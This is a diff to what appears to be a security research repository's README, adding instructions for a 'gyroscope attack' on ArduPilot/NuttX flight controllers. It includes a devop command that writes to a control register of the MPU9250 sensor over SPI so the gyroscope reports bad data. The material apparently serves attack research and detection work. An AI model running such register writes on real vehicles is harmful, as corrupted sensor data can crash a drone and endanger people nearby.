@@ -87,3 +87,32 @@ volatile unsigned int *VTOR_attack = (volatile unsigned int *) 0xE000ED08;
 2) You can confirm the effect of the IRQ attack after booting.
 <img src="https://github.com/purseclab/M2MON/blob/main/attacks/IRQ_attack/result.png">
 
+## Gyroscope attack
+### Prerequisite
+1) Connect NSH (NuttShell) on a command window
+```bash
+module load nsh
+nsh start
+```
+
+2) We used <a href="https://ardupilot.org/mavproxy/docs/modules/devop.html" target="_blank">Direct Comms with SPI/I2C bus</a> in ArduPilot.
+You can learn how to use the Direct Comms with SPI/I2C bus from the documentation. You must know the following information to conduct this attack: 1) device name, 2) bus number, and 3) address.
+We got such information from NuttX source code. For example, if you want to read data from SPI bus, you can execute a command in the below.
+
+```bash
+devop read spi (1)name (2)bus (3)address (4)regstart count
+(1) Where name= device name
+(2) bus=spi bus #
+(3) address=device address
+(4) regstart=register to start at 
+(5) count=number of bytes to write
+```
+
+### How to conduct the gyroscope attack?
+1) Write data on a control register of the MPU9250 gyroscope sensor.
+
+```bash
+devop write spi mpu9250 1 4 26 1 11
+```
+
+2) You might see bad gyroscope sensor data.
